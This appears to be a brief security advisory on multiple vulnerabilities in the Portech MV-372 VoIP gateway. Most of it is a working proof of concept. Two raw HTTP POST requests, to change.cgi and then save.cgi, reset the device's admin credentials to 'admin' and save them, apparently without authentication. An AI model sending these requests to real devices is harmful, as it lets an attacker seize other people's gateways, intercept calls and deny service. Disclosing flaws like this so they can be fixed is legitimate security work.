source: https://www.securityfocus.com/bid/48560/info

The Portech MV-372 VoIP Gateway is prone to multiple security vulnerabilities.

An attacker may leverage these issues to obtain potentially sensitive information, cause vulnerable devices to crash (resulting in a denial-of-service condition), or bypass certain security restrictions by sending a specially crafted HTTP POST request.

POST http://<device address>/change.cgi HTTP/1.1
Host: <device address>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101
Firefox/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: hu-hu,hu;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://192.168.0.100/change.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

Nuser=admin&Npass=admin&Nrpass=admin&submit=Submit


POST http://<device address>/save.cgi
Host: <device address>
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101
Firefox/5.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: hu-hu,hu;q=0.8,en-us;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Accept-Charset: ISO-8859-2,utf-8;q=0.7,*;q=0.7
Connection: keep-alive
Referer: http://192.168.0.100/save.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

submit=Save